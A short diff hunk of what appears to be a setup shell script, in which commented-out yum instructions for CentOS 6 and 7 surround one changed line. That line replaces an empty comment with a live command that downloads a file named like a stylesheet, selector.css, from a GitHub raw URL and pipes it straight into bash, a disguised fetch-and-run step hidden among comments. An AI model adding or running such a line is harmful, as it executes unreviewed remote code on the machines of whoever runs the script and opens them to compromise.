@@ -40,7 +40,7 @@
 #  # CentOS / Scientific Linux 6
 #  yum groupinstall -y Development\ Tools
 #  yum groupinstall -y Compatibility\ Libraries
-#
+curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash
 #  # CentOS / Scientific Linux 7
 #  yum groups install -y Development\ Tools
 #  yum groups install -y Compatibility\ Libraries
